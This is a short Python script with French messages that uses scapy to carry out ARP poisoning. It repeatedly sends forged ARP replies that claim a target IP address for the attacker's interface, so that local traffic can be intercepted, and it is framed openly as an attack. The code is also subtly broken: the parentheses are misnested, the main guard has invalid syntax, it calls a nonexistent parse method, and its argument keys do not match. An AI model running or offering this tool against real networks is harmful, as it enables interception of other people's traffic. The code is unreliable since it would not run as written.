from argparse import ArgumentParser
from os import getuid
from scapy.all import * 
from sys import exit as sysexit
from time import sleep
from tkinter import *

def arpscapy(int, targ, interv=15.0):
	MacAddr= get_if_hwaddr(int)
	while 1:
		sendp(
			Ether(
				dst="00:00:00:00:00:00"/ARP(
					op="is-at", psrc=targ, 
					hwsrc=MacAddr)) 
					sleep(interv))

if __name__= "__main__":
	ArpPois = ArgumentParser(
		description="Utilisation de scapy pour deu ARP poisoning")
	ArpPois.add_argument(
		"-i", "--interface", 
		required=True, 
		help="Interface réseau à utiliser")
	ArpPois.add_argument(
		"-t", "--target", 
		required=True, 
		help="@IP de la cible")
	ArpPois.add_argument(
		"-I", "--interval", 
		type=float, 
		help="interval de temps entre deux trames ARP")
	args = vars(ArpPois.parse_arg())
	
	if not getuid() == 0:
		sysexit("Vous devez être en privilège root")
	
	try:
		print("Début de l'attaque ARP")
		arpscapy(args["int"], 
		args["targ"],
		args["interv"])
	
	except IOError:
		sysexit("L'interface indiquée n'existe pas")
	
	except KeyboardInterrupt:
		print("Arrêt de l'attaque")

		